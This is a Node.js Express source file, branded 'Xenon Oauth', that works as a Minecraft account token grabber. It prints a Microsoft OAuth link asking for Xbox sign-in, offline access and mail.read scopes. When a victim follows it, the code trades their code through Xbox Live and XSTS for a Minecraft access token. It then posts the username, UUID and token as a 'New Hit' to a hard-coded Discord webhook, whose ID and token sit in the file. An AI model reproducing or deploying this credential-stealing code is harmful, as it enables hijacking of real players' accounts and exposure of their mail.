const express = require(`express`);
const app = express();
const i = require(`node:events`)
require('dotenv').config();
const mongoose = require('mongoose');
const chalk = require('chalk');
const fetch = require('node-fetch');
const exampleEmbed = require(`./`);
var http_client_methods_1 = require('http-client-methods');
const { EmbedBuilder, WebhookClient } = require('discord.js');
const webhookClient = new WebhookClient({
	id: '1090664218010845234',
	token: 'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
});
const Cryptr = require('cryptr');
const cryptr = new Cryptr('jeromestgay');
require('dotenv').config();
app.use(require('body-parser').json());
app.use(
	require('body-parser').urlencoded({
		extended: true,
	})
);
const ascii = 
`
\n
▒██   ██▓█████ ███▄    █ ▒█████  ███▄    █     ▒█████  ▄▄▄      █    ██▄▄▄█████▓██░ ██ 
▒▒ █ █ ▒▓█   ▀ ██ ▀█   █▒██▒  ██▒██ ▀█   █    ▒██▒  ██▒████▄    ██  ▓██▓  ██▒ ▓▓██░ ██▒
░░  █   ▒███  ▓██  ▀█ ██▒██░  ██▓██  ▀█ ██▒   ▒██░  ██▒██  ▀█▄ ▓██  ▒██▒ ▓██░ ▒▒██▀▀██░
 ░ █ █ ▒▒▓█  ▄▓██▒  ▐▌██▒██   ██▓██▒  ▐▌██▒   ▒██   ██░██▄▄▄▄██▓▓█  ░██░ ▓██▓ ░░▓█ ░██ 
▒██▒ ▒██░▒████▒██░   ▓██░ ████▓▒▒██░   ▓██░   ░ ████▓▒░▓█   ▓██▒▒█████▓  ▒██▒ ░░▓█▒░██▓
▒▒ ░ ░▓ ░░ ▒░ ░ ▒░   ▒ ▒░ ▒░▒░▒░░ ▒░   ▒ ▒    ░ ▒░▒░▒░ ▒▒   ▓▒█░▒▓▒ ▒ ▒  ▒ ░░   ▒ ░░▒░▒
░░   ░▒ ░░ ░  ░ ░░   ░ ▒░ ░ ▒ ▒░░ ░░   ░ ▒░     ░ ▒ ▒░  ▒   ▒▒ ░░▒░ ░ ░    ░    ▒ ░▒░ ░
 ░    ░    ░     ░   ░ ░░ ░ ░ ▒    ░   ░ ░    ░ ░ ░ ▒   ░   ▒   ░░░ ░ ░  ░      ░  ░░ ░
 ░    ░    ░  ░        ░    ░ ░          ░        ░ ░       ░  ░  ░             ░  ░  ░ \n`;
const axios = require(`axios`);
var usernameArray = [];
var port = process.env.PORT || 8080
var clientId = process.env.clientId
var clientSecret = process.env.clientSecret
var redirectUrl = process.env.redirectUrl
var microsoftOauthUrl = 'https://login.live.com/oauth20_token.srf';
var scopes = encodeURIComponent(
	`XboxLive.signin offline_access openid https://graph.microsoft.com/mail.read`
);
console.log(`anything ----------------------------------------`)
console.clear();
console.log(chalk.red(ascii));

app.listen(port, () => {
	console.log(`\nlistening on port ${port}`)
});

app.get(`/token`, async (req, res) => {
	res.sendFile(__dirname + `/index.html`);
	let code = req.query.code;
	const access_token_response = await getAccesToken(
		clientId,
		code,
		clientSecret,
		redirectUrl
	);
	var accesstoken = access_token_response[0];
	console.log(`anything ----------------------------------------`)
	var refreshtoken = access_token_response[1];
	var xblToken = await getXblToken(accesstoken);
	var XstsList = await GetXstsToken(xblToken);
	var XstsToken = XstsList[0];
	var XstsUuid = XstsList[1];
	var MinecraftTokenResponse = await getMcToken(XstsToken, XstsUuid);
	var MinecraftToken = MinecraftTokenResponse.access_token;
	console.log(MinecraftToken)
	var IgnAndUuid = await getUsername(MinecraftToken);
	var Ign = IgnAndUuid[0];
	var Uuid = IgnAndUuid[1];
	await sendEmbed(MinecraftToken, Uuid, Ign);
});

async function createLink(id, url, scopes) {
	var azureUrl = chalk.red.underline(
		`https://login.live.com/oauth20_authorize.srf?client_id=${id}&response_type=code&redirect_uri=${url}&scope=${scopes}`
	);
	console.log(azureUrl);
}

createLink(clientId, redirectUrl, scopes);

async function getAccesToken(clientid, code, client_secret, redirect_uri) {
	var body = `client_id=${clientid}&client_secret=${client_secret}&code=${code}&grant_type=authorization_code&redirect_uri=${redirect_uri}`;
	var response = await http_client_methods_1.HttpPost(microsoftOauthUrl, body, {
		'Content-Type': 'application/x-www-form-urlencoded',
	});
	var repParse = JSON.parse(response);
	var accessToken = repParse.access_token;
	var refreshToken = repParse.refresh_token;

	return [accessToken, refreshToken];
}

async function getXblToken(access_token) {
	var config = {
		Properties: {
			AuthMethod: 'RPS',
			SiteName: 'user.auth.xboxlive.com',
			RpsTicket: 'd='.concat(access_token), // your access token from the previous step here
		},
		RelyingParty: 'http://auth.xboxlive.com',
		TokenType: 'JWT',
	};
	const response = await http_client_methods_1.HttpPost('https://user.auth.xboxlive.com/user/authenticate', JSON.stringify(config), { 'Content-Type': 'application/json', 'Accept': 'application/json' });
	const ParsedRes = JSON.parse(response)
	const xblToken = ParsedRes.Token;

	return xblToken;
}

async function GetXstsToken(xblToken) {
	var config = {
		Properties: {
			SandboxId: 'RETAIL',
			UserTokens: [
				xblToken, // from above
			],
		},
		RelyingParty: 'rp://api.minecraftservices.com/',
		TokenType: 'JWT',
	};
	const response = await http_client_methods_1.HttpPost(
		`https://xsts.auth.xboxlive.com/xsts/authorize`,
		JSON.stringify(config)
	);
	const ParsedRes = JSON.parse(response);
	const XstsToken = ParsedRes.Token;
	const XstsUuid = ParsedRes.DisplayClaims.xui[0].uhs;
	return [XstsToken, XstsUuid];
}

async function getMcToken(xstsToken, xstsUuid) {
	const config = {
		identityToken: 'XBL3.0 x='.concat(xstsUuid) + ';'.concat(xstsToken),
	};
	const response = await http_client_methods_1.HttpPost(
		'https://api.minecraftservices.com/authentication/login_with_xbox',
		config
	);
	const RepParsed = JSON.parse(response);
	return RepParsed;
}

async function getUsername(token) {
	const config = {
		headers: {
			Authorization: 'Bearer ' + token,
		},
	};
	const response = await axios.get(
		`https://api.minecraftservices.com/minecraft/profile`,
		config
	);
	var ign = response.data.name;
	var uuid = response.data.id;
	return [ign, uuid];
}

async function sendEmbed(MinecraftToken, uuid, username) {
	const webhook = new WebhookClient({
		id: '1090664218010845234',
		token:
			'Q-DVC872Mk_M_XgzSeJ2CfPI9FQ7KNxS8moqWVOLzKhskQAXFgPdG1mjUY2-zei52mQM',
	});
	const embed = new EmbedBuilder()
		.setTitle(`**New Hit ❗**`)
		.setAuthor({ name: 'Xenon', iconURL: 'https://i.imgur.com/nXvl29a.png'})
		.setDescription('@everyone')
		.setColor(0x0099FF)
		.addFields(
			{ name: 'Nom', value: `\`${username}\``, inline: true },
			{ name: 'UUID', value: `\`${uuid}\``, inline: true },
			{
				name: 'Minecraft Auth',
				value: `\`${username}:${uuid}:${MinecraftToken}\``,
			}
		)
		.setFooter({ text: 'legion*#4154', iconURL: 'https://i.imgur.com/rlHZ2Sx.png' })
		.setTimestamp();

	webhook.send({
		embeds: [embed],
	});
}
